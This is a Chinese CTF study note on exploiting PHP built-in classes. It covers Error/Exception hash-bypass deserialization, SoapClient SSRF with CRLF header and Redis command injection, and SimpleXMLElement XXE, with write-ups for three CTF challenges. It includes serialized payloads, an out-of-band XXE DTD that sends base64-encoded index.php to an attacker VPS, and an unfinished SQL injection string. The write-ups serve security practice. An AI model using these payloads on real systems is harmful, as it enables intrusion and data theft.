方法返回的结果是相同的。注意，这里之所以需要在同一行是因为 __toString 返回的数据包含当前行号。\nException 类与 Error 的使用和结果完全一样，只不过 Exception 类适用于PHP 5和7，而 Error 只适用于 PHP 7。\nError和Exception类的这一点在绕过在PHP类中的哈希比较时很有用。\n[2020 极客大挑战]Greatphp\n &lt;?phperror_reporting(0);class SYCLOVER &#123;    public $syc;    public $lover;    public function __wakeup()&#123;        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;           if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123;               eval($this-&gt;syc);           &#125; else &#123;               die(&quot;Try Hard !!&quot;);           &#125;                   &#125;    &#125;&#125;if (isset($_GET[&#x27;great&#x27;]))&#123;    unserialize($_GET[&#x27;great&#x27;]);&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;\n​\t\t我们可以将题目代码中的 $syc 和 $lover 分别声明为类似上面的内置类的对象，让这两个对象本身不同（传入的错误代码即可），但是 __toString 方法输出的结果相同即可\n​\t\t由于题目用preg_match过滤了小括号无法调用函数，所以我们尝试直接 include “/flag” 将flag包含进来即可；由于过滤了引号，我们直接用url取反绕过即可\npoc：这里说一下url取反\nURL编码取反绕过\n适用PHP版本：无限制\n当PHP&gt;=7时，可以直接利用取反构造payload\n\nPS C:\\Users\\Administrator&gt; php -r &quot;var_dump(urlencode(~'phpinfo'));&quot;\nCommand line code:1:\nstring(21) &quot;%8F%97%8F%96%91%99%90&quot;\n\n//实际上\n(~%8F%97%8F%96%91%99%90)();\n#phpinfo();\n\n//利用链如下&lt;?php$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;   //~urldecode=/flag$a=new Error($str,1);$b=new Error($str,2);$c = new SYCLOVER();$c-&gt;syc = $a;$c-&gt;lover = $b;echo(urlencode(serialize($c)));?&gt;//这里解释以下，为什么要闭合掉&quot;?&gt;&quot;，因为前面可能会有一些报错的信息，所以可以先闭合掉前面的东西，然后再来包含后面的是取反，因为在链里//面所以需要用到解码，不用编码绕不过去正则，里面是/flag因为刷题多了都在根目录下面，不在的话正能一步步尝试。\n10.3 SoapClient 类进行 SSRF\nSoapClient 类\nSOAP（简单对象访问协议）是连接Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式，仅限于http/https协议。SOAP消息基本上是从发送端到接收端的单向传输，但它们常常结合起来执行类似于请求 / 应答的模式。\n如果想要使用SoapClient类需要在php.ini配置文件里面开启extension=php_soap.dll选项\n类摘要：\nSoapClient &#123;    /* 方法 */    public __construct ( string|null $wsdl , array $options = [] )    public __call ( string $name , array $args ) : mixed    public __doRequest ( string $request , string $location , string $action , int $version , bool $oneWay = false ) : string|null    public __getCookies ( ) : array    public __getFunctions ( ) : array|null    public __getLastRequest ( ) : string|null    public __getLastRequestHeaders ( ) : string|null    public __getLastResponse ( ) : string|null    public __getLastResponseHeaders ( ) : string|null    public __getTypes ( ) : array|null    public __setCookie ( string $name , string|null $value = null ) : void    public __setLocation ( string $location = &quot;&quot; ) : string|null    public __setSoapHeaders ( SoapHeader|array|null $headers = null ) : bool    public __soapCall ( string $name , array $args , array|null $options = null , SoapHeader|array|null $inputHeaders = null , array &amp;$outputHeaders = null ) : mixed&#125;\n可以看到，该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。\n该类的构造函数如下：\npublic SoapClient :: SoapClient(mixed $wsdl [，array $options ])\n\n第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。\n第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。\n\n使用 SoapClient 类进行 SSRF\n知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url。\n&lt;?php$a = new SoapClient(null,array(&#x27;location&#x27;=&gt;&#x27;http://192.168.91.153:2333/aaa&#x27;, &#x27;uri&#x27;=&gt;&#x27;http://192.168.91.153:2333&#x27;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt;\nexample：\n首先在192.168.91.153:2333上起一个监听，然后再执行上述代码，就能够成功发送HTTP请求：\nroot@ubuntu18:~# nc -lvp 2333Listening on [0.0.0.0] (family 0, port 2333)Connection from 192.168.91.1 7856 received!POST /aaa HTTP/1.1Host: 192.168.91.153:2333Connection: Keep-AliveUser-Agent: PHP-SOAP/7.4.3Content-Type: text/xml; charset=utf-8SOAPAction: &quot;http://192.168.91.153:2333#a&quot;Content-Length: 387 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;http://192.168.91.153:2333&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;\n这里不知为何我开启不了这个类,先看个思路\n但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。\n如下测试代码，我们在HTTP头中插入一个cookie：\n&lt;?php$target = &#x27;http://192.168.91.153:2333/&#x27;;$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &quot;WHOAMI\\r\\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4&quot;, &#x27;uri&#x27; =&gt; &#x27;test&#x27;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt;\n执行代码后，如下图所示，成功在HTTP头中插入了一个我们自定义的cookie：\nroot@ubuntu18:~# nc -lvp 2333Listening on [0.0.0.0] (family 0, port 2333)Connection from 192.168.91.1 7858 received!POST / HTTP/1.1Host: 192.168.91.153:2333Connection: Keep-AliveUser-Agent: WHOAMICookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4        # 插入的cookieContent-Type: text/xml; charset=utf-8SOAPAction: &quot;test#a&quot;Content-Length: 365 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;test&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;\n利用HTTP协议去攻击Redis：\n&lt;?php$target = &#x27;http://192.168.91.153:2333/&#x27;;$poc = &quot;CONFIG SET dir /var/www/html&quot;;$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target, &#x27;uri&#x27; =&gt; &#x27;hello^^&#x27;.$poc.&#x27;^^hello&#x27;));$b = serialize($a);$b = str_replace(&#x27;^^&#x27;,&quot;\\n\\r&quot;,$b); echo $b;$c = unserialize($b);$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt;\n执行代码后，如下图所示，成功插入了Redis命令：\nroot@ubuntu18:~# nc -lvp 2333Listening on [0.0.0.0] (family 0, port 2333)Connection from 192.168.91.1 7860 received!POST / HTTP/1.1Host: 192.168.91.153:2333Connection: Keep-AliveUser-Agent: PHP-SOAP/7.4.3Content-Type: text/xml; charset=utf-8SOAPAction: &quot;helloCONFIG SET dir /var/www/html        # 这里就是Redis命令hello#a&quot;Content-Length: 403 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;helloCONFIG SET dir /var/www/htmlhello&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;\n这样我们就可以利用HTTP协议去攻击Redis了。\n对于如何发送POST的数据包，这里面还有一个坑，就是 Content-Type 的设置，因为我们要提交的是POST数据，所以 Content-Type 的值我们要设置为 application/x-www-form-urlencoded，这里如何修改 Content-Type 的值呢？由于 Content-Type 在 User-Agent 的下面，所以我们可以通过 SoapClient 来设置 User-Agent ，将原来的 Content-Type 挤下去，从而再插入一个新的 Content-Type 。\n&lt;?php$target = &#x27;http://192.168.91.153:2333/&#x27;;$post_data = &#x27;data=whoami&#x27;;$headers = array(    &#x27;X-Forwarded-For: 127.0.0.1&#x27;,    &#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;);$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;.join(&#x27;^^&#x27;,$headers).&#x27;^^Content-Length: &#x27;. (string)strlen($post_data).&#x27;^^^^&#x27;.$post_data,&#x27;uri&#x27;=&gt;&#x27;test&#x27;));$b = serialize($a);$b = str_replace(&#x27;^^&#x27;,&quot;\\n\\r&quot;,$b);echo $b;$c = unserialize($b);$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt;\n执行代码后，成功发送POST数据：\nroot@ubuntu18:~# nc -lvp 2333Listening on [0.0.0.0] (family 0, port 2333)Connection from 192.168.91.1 7862 received!POST / HTTP/1.1Host: 192.168.91.153:2333Connection: Keep-AliveUser-Agent: wupcoContent-Type: application/x-www-form-urlencodedX-Forwarded-For: 127.0.0.1Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93Content-Length: 11 data=whoamiContent-Type: text/xml; charset=utf-8SOAPAction: &quot;test#a&quot;Content-Length: 365 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:ns1=&quot;test&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:SOAP-ENC=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot; SOAP-ENV:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;\n[LCTF 2018]bestphp’s revenge\n题目给了源码(跟着复现一波)\n &lt;?phphighlight_file(__FILE__);$b = &#x27;implode&#x27;;call_user_func($_GET[&#x27;f&#x27;], $_POST);session_start();if (isset($_GET[&#x27;name&#x27;])) &#123;    $_SESSION[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];&#125;var_dump($_SESSION);$a = array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;);call_user_func($b, $a);?&gt; array(0) &#123; &#125; \n扫一下目录：flag.php\necho &#x27;only localhost can get flag!&#x27;;$flag = &#x27;LCTF&#123;*************************&#125;&#x27;;if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;       $_SESSION[&#x27;flag&#x27;] = $flag;   &#125;\n这里说说明了需要本地地址访问才能输出flag。\n1. 变量覆盖\n首先我们看到第一个call_user_func()函数里面2个参数我们都可控，因此想到用extract()函数进行变量覆盖，先用var_dump()看一下session的内容：\n\n这里能实现步骤为f赋值为extract，接着post传参b=var_dump，在第一个第一个call_user_func()函数中extract函数多了一个变量b，即extract(b)，由于extract函数的特性，函数内部实际上为extract（b=&gt;var_dump），于是形成$b=var_dump随后name赋值为job，在第二个call_user_func()函数中,构成了var_dump(array(reset($_SESSION), ‘welcome_to_the_lctf2018’))，输出参数中变量的相关信息\n2. session反序列化\n于是我们想通过`ini_set()`函数来构造`ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);`来改变序列化时的处理器，从而使其和反序列化时处理引擎不同，但是这个函数不接受数组,`$_POST`中需要设置参数传输； 所以用`session_start([&#x27;serialize_handler&#x27;=&gt;&#x27;php_serialize&#x27;])`，即POST传入`serialize_handler=php_serialize`来改变处理器，因为`session_start()`中如果提供参数，那么会用其中的项目覆盖会话配置指示中的配置项。即构造 `session_start(serialize_handler=php_serialize)` 就行了。我们可以利用题目中的 `call_user_func($_GET[&#x27;f&#x27;], $_POST);` 函数，传入`GET：/?f=session_start`、`POST：serialize_handler=php_serialize`，实现 `session_start(serialize_handler=php_serialize)` 的调用来修改此页面的序列化引擎为php_serialize。\n3. SoapClient类的利用\nphp中的SoapClient类可以创建soap数据报文，与wsdl接口进行交互。该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。\npublic SoapClient::SoapClient ( mixed $wsdl [, array $options ] )\n其中$options数组下有个user_agent选项，我们可以利用该选项来自定义User-Agent。而在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码。\n&lt;?php$target = &quot;http://127.0.0.1/flag.php&quot;;$attack = new SoapClient(null, array(&#x27;location&#x27; =&gt; $target,    &#x27;user_agent&#x27; =&gt; &quot;btis\\r\\nCookie: PHPSESSID=r9i78lda5e28i65bdlcsjb3l06\\r\\n&quot;,    &#x27;uri&#x27; =&gt; &quot;123&quot;));$payload = urlencode(serialize($attack));echo $payload;\n其中有两个必备参数location是要将请求发送到的SOAP服务器的URL，uri 是SOAP服务的目标命名空间。我们将location设置为http://127.0.0.1/flag.php即本地flag.php文件，这个条件满足了flag.php中要求的$_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;，uri随便填就好。其中user_agent，是我们用来定义User-Agent，利用CRLF同时传入页面的cookie，使$_SESSION['flag'] = $flag;保存到指定cookie中。\nO%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22btis%0D%0ACookie%3A+PHPSESSID%3Dr9i78lda5e28i65bdlcsjb3l06%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D//注意传入的时候在O前面加了一个|符号，由于序列化与反序列化处理引擎不一样，反序列化时的引擎为PHP，会将|看做键值分隔符，将其后面的内容直接反序列化，也就是在你要解析session文件时，他会将你|后面的内容反序列化\n\n利用php_serialize序列化传入后，并用php反序列化处理后此时session中包含了：一个键名a:1:&#123;s:4:&quot;name&quot;;s:222:&quot;，和一个SoapClient对象\narray(1) &#123;  [&quot;a:1:&#123;s:4:&quot;name&quot;;s:222:&quot;&quot;]=&gt;  object(SoapClient)#1 (5) &#123;    [&quot;uri&quot;]=&gt;    string(3) &quot;123&quot;    [&quot;location&quot;]=&gt;    string(25) &quot;http://127.0.0.1/flag.php&quot;    [&quot;_stream_context&quot;]=&gt;    int(0)    [&quot;_user_agent&quot;]=&gt;    string(52) &quot;JohnCookie: PHPSESSID=c472u8eh63tvqe5kq44o4mq3b1&quot;    [&quot;_soap_version&quot;]=&gt;    int(1)  &#125;&#125;\n但此时还不会触发SSRF，需要触发 __call 方法来造成SSRF，该方法在访问对象中一个不存在的方法时会被自动调用，所以单纯反序列化还不行，我们还需要访问该对象中一个不存在的方法，这里就用到了如下这段代码：\n$a = array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;);call_user_func($b, $a);\n我们可以利用extract函数将变量b覆盖为call_user_func，这样，就成了：\ncall_user_func(call_user_func, array(reset($_SESSION), &#x27;welcome_to_the_lctf2018&#x27;));\ncall_user_func()函数有一个特性，就是当只传入一个数组时，可以用call_user_func()来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名。\n下面我们用extract()将$b覆盖成call_user_func()，reset($_SESSION)就是$_SESSION['name']，所以我们传入name=SoapClient\n最后的call_user_func($b, $a)就变成了call_user_func(array('SoapClient','welcome_to_the_lctf2018')),即call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)。\n因为SoapClient对象中没有welcome_to_the_lctf2018这个方法，就会调用魔术方法__call()从而发送请求，造成SSRF去访问flag.php。\n\n如上图，访问之后，自动发送了http请求，访问session文件，此时PHP反序列化引擎会反序列化你之前输入的内容，于是成功绕过本地地址访问的限制，于是变量flag存入session，然后我们接着访问index.php，页面会输出session文件的内容，回显flag\n这一步由于会触发SSRF请求，因此会等待很久。\n10.4 SimpleXMLElement 类进行 XXE\nSimpleXMLElement 类\nSimpleXMLElement 这个内置类用于解析 XML 文档中的元素。\n官方文档中对于SimpleXMLElement 类的构造方法 SimpleXMLElement::__construct 的定义如下：\npublic SimpleXMLElement::__construct(    string $data,    int $options = 0,    bool $dataIsURL = false,    string $namespaceOrPrefix = &quot;&quot;,    bool $isPrefix = false)\n其中值得注意的是$data和$data_is_url这两个参数：\n$data：格式正确的XML字符串，或者XML文档的路径或URL（如果$data_is_url为true）。\n$data_is_url：默认情况下$data_is_url为false。使用true指定$data的路径或URL到一个XML文件，而不是字符串数据。\n可以看到通过设置第三个参数 $data_is_url 为 true，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为2即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。\n这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。\nexample：\n&lt;?php$xml = &lt;&lt;&lt;EOF&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY % remote SYSTEM &quot;http://t6n089.ceye.io&quot;&gt;%remote;]&gt;]&gt;&lt;x&gt;&amp;xee&lt;/x&gt;EOF;$xml_class = new SimpleXMLElement($xml, LIBXML_NOENT);var_dump($xml_class);?&gt;\n实现了引用外部实体。同理我们可以让上面代码中的$xml中的内容放到自己的VPS中，然后在新建类对象的时候第一个参数写的是URL地址去实现XML文件的远程载入，这样也能实现XXE。\n[SUCTF 2018]Homework\n题目分析\n先注册账号登陆作业平台。看到一个calc计算器类。有两个按钮，一个用于调用calc类实现两位数的四则运算。另一个用于提交代码。\n\n点击CALC按钮，观察返回的结果和URL\n\n再根据calc类里面的内容，不难判断得知，这里通过module传参去调用calc类，然后剩下3个变量是calc($args1,$method,$args2)函数中参数。\nSimpleXMLElement 类的使用\n首先，我们在vps（124.220.233.26）上构造如下evil.xml、send.xml这两个文件。\nevil.xml：\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE try[&lt;!ENTITY % int SYSTEM &quot;https://VPS/tmp/semd.xml&quot;&gt;%int;%all;%send;]&gt;\nsend.xml：\n&lt;!ENTITY % payl SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;https://VPS/?%payl;&#x27;&gt;&quot;&gt;\n然后在url中构造如下：\n/show.php?module=SimpleXMLElement&amp;args[]=http://124.220.233.26/tmp/evil.xml&amp;args[]=2&amp;args[]=true\n然后我们就可以看web日志：（这个作者也是埋坑呢，这里他用的https协议，我们改成http即可）\n\nbase64解码，得到源码\n\n&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;PHP Homework Platform&lt;/title&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;script type=&quot;application/x-javascript&quot;&gt; addEventListener(&quot;load&quot;, function() &#123; setTimeout(hideURLbar, 0); &#125;, false); function hideURLbar()&#123; window.scrollTo(0,1); &#125; &lt;/script&gt;&lt;link href=&quot;css/font-awesome.min.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;all&quot;&gt;&lt;link href=&quot;css/snow.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;all&quot; /&gt;&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;all&quot; /&gt;&lt;link type=&quot;text/css&quot; rel=&quot;stylesheet&quot; href=&quot;images/Styles/SyntaxHighlighter.css&quot;&gt;&lt;/link&gt;&lt;/head&gt;&lt;body&gt;&lt;!-- /home/wwwroot/default--&gt;&lt;div class=&quot;snow-container&quot;&gt;\t\t\t  &lt;div class=&quot;snow foreground&quot;&gt;&lt;/div&gt;\t\t\t  &lt;div class=&quot;snow foreground layered&quot;&gt;&lt;/div&gt;\t\t\t  &lt;div class=&quot;snow middleground&quot;&gt;&lt;/div&gt;\t\t\t  &lt;div class=&quot;snow middleground layered&quot;&gt;&lt;/div&gt;\t\t\t  &lt;div class=&quot;snow background&quot;&gt;&lt;/div&gt;\t\t\t  &lt;div class=&quot;snow background layered&quot;&gt;&lt;/div&gt;\t\t\t&lt;/div&gt;&lt;div class=&quot;top-buttons-agileinfo&quot;&gt;&lt;/div&gt;&lt;h1&gt;PHP Homework Platform&lt;/h1&gt;&lt;div class=&quot;main-agileits&quot;&gt;&lt;?php\tinclude(&quot;function.php&quot;);\tinclude(&quot;config.php&quot;);\t$username=w_addslashes($_COOKIE[&#x27;user&#x27;]);\t$check_code=$_COOKIE[&#x27;cookie-check&#x27;];\t$check_sql=&quot;select password from user where username=&#x27;&quot;.$username.&quot;&#x27;&quot;;\t$check_sum=md5($username.sql_result($check_sql,$mysql)[&#x27;0&#x27;][&#x27;0&#x27;]);\tif($check_sum!==$check_code)&#123;\t\theader(&quot;Location: login.php&quot;);\t&#125;?&gt;\t\t&lt;textarea name=&quot;code&quot; class=&quot;php&quot; rows=&quot;20&quot; cols=&quot;55&quot; disabled=&quot;disabled&quot;&gt;&lt;?php readfile(&quot;./calc.php&quot;);?&gt;\t\t&lt;/textarea&gt;\t\t&lt;div class=&quot;top-buttons-agileinfo&quot;&gt;\t\t\t&lt;a href=&quot;show.php?module=calc&amp;args[]=2&amp;args[]=a&amp;args[]=2&quot;&gt;calc&lt;/a&gt;\t\t\t&lt;a href=&quot;submit.php&quot; class=&quot;active&quot;&gt;Submit homework&lt;/a&gt;\t\t&lt;/div&gt;&lt;/div&gt;\t&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery-2.1.4.min.js&quot;&gt;&lt;/script&gt;\t&lt;script class=&quot;javascript&quot; src=&quot;images/Scripts/shBrushPhp.js&quot;&gt;&lt;/script&gt;\t&lt;script class=&quot;javascript&quot;&gt;\t\tdp.SyntaxHighlighter.HighlightAll(&#x27;code&#x27;);\t&lt;/script&gt; &lt;/body&gt;&lt;/html&gt;\nSQL二次注入\nindex.php\n&lt;?php    include(&quot;function.php&quot;);    include(&quot;config.php&quot;);     $username=w_addslashes($_COOKIE[&#x27;user&#x27;]);    $check_code=$_COOKIE[&#x27;cookie-check&#x27;];    $check_sql=&quot;select password from user where username=&#x27;&quot;.$username.&quot;&#x27;&quot;;    $check_sum=md5($username.sql_result($check_sql,$mysql)[&#x27;0&#x27;][&#x27;0&#x27;]);    if($check_sum!==$check_code)&#123;        header(&quot;Location: login.php&quot;);    &#125;?&gt;&lt;?php readfile(&quot;./calc.php&quot;);?&gt;\nfunction.php\n&lt;?php function sql_result($sql,$mysql)&#123;    if($result=mysqli_query($mysql,$sql))&#123;        $result_array=mysqli_fetch_all($result);        return $result_array;    &#125;else&#123;         echo mysqli_error($mysql);         return &quot;Failed&quot;;    &#125;&#125; function upload_file($mysql)&#123;    if($_FILES)&#123;        if($_FILES[&#x27;file&#x27;][&#x27;size&#x27;]&gt;2*1024*1024)&#123;            die(&quot;File is larger than 2M, forbidden upload&quot;);        &#125;        if(is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]))&#123;            if(!sql_result(&quot;select * from file where filename=&#x27;&quot;.w_addslashes($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]).&quot;&#x27;&quot;,$mysql))&#123;                $filehash=md5(mt_rand());                if(sql_result(&quot;insert into file(filename,filehash,sig) values(&#x27;&quot;.w_addslashes($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]).&quot;&#x27;,&#x27;&quot;.$filehash.&quot;&#x27;,&quot;.(strrpos(w_addslashes($_POST[&#x27;sig&#x27;]),&quot;)&quot;)?&quot;&quot;:w_addslashes($_POST[&#x27;sig&#x27;])).&quot;)&quot;,$mysql)==&quot;Failed&quot;)                     die(&quot;Upload failed&quot;);                $new_filename=&quot;./upload/&quot;.$filehash.&quot;.txt&quot;;                move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $new_filename) or die(&quot;Upload failed&quot;);                die(&quot;Your file &quot;.w_addslashes($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]).&quot; upload successful.&quot;);            &#125;else&#123;                $hash=sql_result(&quot;select filehash from file where filename=&#x27;&quot;.w_addslashes($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]).&quot;&#x27;&quot;,$mysql) or die(&quot;Upload failed&quot;);                $new_filename=&quot;./upload/&quot;.$hash[0][0].&quot;.txt&quot;;                move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;], $new_filename) or die(&quot;Upload failed&quot;);                die(&quot;Your file &quot;.w_addslashes($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]).&quot; upload successful.&quot;);            &#125;        &#125;else&#123;            die(&quot;Not upload file&quot;);        &#125;    &#125;&#125;   function w_addslashes($string)&#123;    return addslashes(trim($string));&#125;   function do_api($module,$args)&#123;    $class = new ReflectionClass($module);    $a=$class-&gt;newInstanceArgs($args);&#125;?&gt;\nshow.php\n&lt;?php    include(&quot;function.php&quot;);    include(&quot;config.php&quot;);    include(&quot;calc.php&quot;);    if(isset($_GET[&#x27;action&#x27;])&amp;&amp;$_GET[&#x27;action&#x27;]==&quot;view&quot;)&#123;        if($_SERVER[&quot;REMOTE_ADDR&quot;]!==&quot;127.0.0.1&quot;) die(&quot;Forbidden.&quot;);        if(!empty($_GET[&#x27;filename&#x27;]))&#123;            $file_info=sql_result(&quot;select * from file where filename=&#x27;&quot;.w_addslashes($_GET[&#x27;filename&#x27;]).&quot;&#x27;&quot;,$mysql);            $file_name=$file_info[&#x27;0&#x27;][&#x27;2&#x27;];            echo(&quot;file code: &quot;.file_get_contents(&quot;./upload/&quot;.$file_name.&quot;.txt&quot;));            $new_sig=mt_rand();            sql_result(&quot;update file set sig=&#x27;&quot;.intval($new_sig).&quot;&#x27; where id=&quot;.$file_info[&#x27;0&#x27;][&#x27;0&#x27;].&quot; and sig=&#x27;&quot;.$file_info[&#x27;0&#x27;][&#x27;3&#x27;].&quot;&#x27;&quot;,$mysql);            die(&quot;&lt;br&gt;new sig:&quot;.$new_sig);        &#125;else&#123;            die(&quot;Null filename&quot;);        &#125;    &#125;     $username=w_addslashes($_COOKIE[&#x27;user&#x27;]);    $check_code=$_COOKIE[&#x27;cookie-check&#x27;];    $check_sql=&quot;select password from user where username=&#x27;&quot;.$username.&quot;&#x27;&quot;;    $check_sum=md5($username.sql_result($check_sql,$mysql)[&#x27;0&#x27;][&#x27;0&#x27;]);    if($check_sum!==$check_code)&#123;        header(&quot;Location: login.php&quot;);    &#125;     $module=$_GET[&#x27;module&#x27;];    $args=$_GET[&#x27;args&#x27;];    do_api($module,$args);?&gt;\nshow.php中，限制了 ip 只能是127.0.0.1，说明只能通过 XXE 去触发SSRF。这里根据filename获取数据库中的 sig 然后进行 update 操作，但没有对 sig 值进行过滤，导致二次注入。\n再看一下function.php中的upload_file()上传文件部分，首先他会判断 filename 是否存在，如果不存在就会插入数据库，这里 sig 没有用单引号保护，但是用了 addslashes() 进行转义，而我们要插入二次注入的语句必须得有单引号，这个时候就可以用 hex 编码进行绕过。\n因为sql_result()函数中会输出 sql 错误，所以我们用 updatexml 函数进行报错注入。构造 payload:\n数据库可以识别16进制并解码\n&#x27;||extractvalue(1,concat(0x7e,(select flag from 